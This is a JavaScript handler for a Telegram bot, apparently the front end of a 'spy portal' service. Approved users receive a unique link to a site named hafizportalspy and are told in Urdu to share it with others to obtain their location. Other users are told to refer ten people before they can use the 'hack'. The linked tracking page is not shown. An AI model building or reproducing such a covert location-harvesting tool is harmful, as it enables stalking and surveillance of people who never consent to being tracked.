const BOT_TOKEN = process.env.BOT_TOKEN;
const BASE_URL = 'https://hafizportalspy.vercel.app';
const approvedUsers = new Set(['7187468717']); // Add more IDs if needed

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();

  const body = req.body;
  const message = body.message;

  if (!message || !message.chat || !message.from) {
    return res.status(200).end(); // Ignore invalid messages
  }

  const chat_id = message.chat.id;
  const user_id = message.from.id.toString();
  const text = message.text || '';

  if (text === '/start') {
    if (approvedUsers.has(user_id)) {
      const link = `${BASE_URL}?id=${user_id}`;
      const reply = `✅ Aap verified hain! Apka unique link yeh hai:\n\n${link}\n\nIs link ko share karein aur unki location hasil karein.`;
      await sendMessage(chat_id, reply);
    } else {
      const reply = `❌ Access Locked!\n\n🌐 Aap abhi tak verify nahi huay.\n\n🔁 Pehle @hafizportalbot par 10 logon ko refer karein.\n\n✨ Jaise hi referrals complete hote hain, aap is hack ka use kar sakte hain.\n\n📌 Join & Refer Now: @hafizportalbot`;
      await sendMessage(chat_id, reply);
    }
    return res.status(200).end();
  }

  await sendMessage(chat_id, '🤖 Type /start to begin.');
  return res.status(200).end();
}

async function sendMessage(chat_id, text) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id,
      text,
      parse_mode: 'Markdown',
      disable_web_page_preview: true,
    }),
  });
}
